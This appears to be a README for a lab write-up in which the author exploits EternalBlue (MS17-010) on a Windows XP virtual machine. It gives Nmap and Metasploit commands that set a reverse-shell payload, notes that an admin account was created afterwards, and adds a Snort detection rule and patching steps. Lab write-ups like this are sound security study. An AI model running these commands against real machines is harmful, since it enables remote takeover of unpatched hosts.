# 💀 EternalBlue SMB Exploit — CVE-2017-0144 (MS17-010)

> Isolated VMware lab | Kali Linux → Windows XP | Educational purposes only.

---

## What I Did

Exploited the EternalBlue vulnerability (the same one used in the **WannaCry ransomware attack**) to gain a remote shell on an unpatched Windows XP machine.

**Attack flow:**
```
Nmap scan → confirmed SMB port 445 vulnerable
Metasploit → eternalblue module → reverse shell
Post-exploitation → user enumeration → created admin account
Wireshark → captured full exploitation traffic
```

## Tools
`Metasploit` `Nmap` `Wireshark` `Snort`

## Key Commands
```bash
nmap --script smb-vuln-ms17-010 192.168.85.136
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set PAYLOAD windows/shell/reverse_tcp
msf > exploit
```

## Detection (Snort Rule)
```
alert tcp any any -> any 445 (msg:"Possible EternalBlue - SMB Attack"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:1000001; rev:1;)
```

## Fix
- Apply patch **MS17-010**
- Disable SMBv1: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
- Block port 445 at the firewall

📄 See `report.pdf` for full walkthrough with screenshots.
